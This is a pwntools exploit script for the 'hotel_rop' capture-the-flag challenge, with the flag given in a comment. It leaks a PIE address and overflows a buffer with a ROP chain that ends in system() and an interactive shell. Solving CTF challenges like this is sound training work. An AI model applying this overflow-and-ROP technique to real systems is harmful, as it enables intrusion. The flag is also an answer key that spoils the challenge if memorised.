#flag = dctf{ch41n_0f_h0t3ls}
from pwn import *

elf = ELF("./hotel_rop")

target = process([elf.path])
target = remote("dctf1-chall-hotel-rop.westeurope.azurecontainer.io", 7480)

target.recvuntil("main street ")
pie_base = int(target.recvline().strip(), 0x10) - 0x136d
log.info("PIE Base: " + hex(pie_base))

pop_rdi = p64(pie_base + 0x000000000000140b)

payload = "A"*0x28
payload += p64(pie_base + elf.sym['california']) + p64(pie_base + elf.sym['silicon_valley']) + p64(pie_base + 0x11db) 
payload += pop_rdi + p64(pie_base + elf.sym['win_land']) + p64(pie_base + elf.plt['system'])

target.sendline(payload)

target.interactive()